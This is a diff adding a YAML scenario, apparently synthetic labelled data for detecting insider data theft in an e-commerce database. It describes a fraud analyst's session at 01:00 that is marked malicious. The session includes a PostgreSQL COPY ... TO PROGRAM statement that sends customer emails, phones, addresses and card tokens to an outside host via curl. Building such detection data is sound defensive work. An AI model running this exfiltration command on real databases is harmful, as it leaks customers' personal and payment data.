@@ -1,0 +1,24 @@
+scenario_id: ecommerce_fraud_analyst_exfil_0011
+family_id: ecommerce_fraud_analyst_exfil_0011
+domain: ecommerce
+time_of_day: 01:00
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: fraud_analyst
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.3551891624126553
+  events:
+  - sql: SELECT c.email, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id WHERE pay.paid_at
+      > NOW() - INTERVAL '24 hours' ORDER BY pay.amount DESC
+  - step_id: exfil
+    sql: COPY (SELECT c.email, c.phone, c.shipping_address, pay.card_last4, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id)
+      TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'
+    connects_to:
+      ip: 45.33.12.9
+      port: 4444
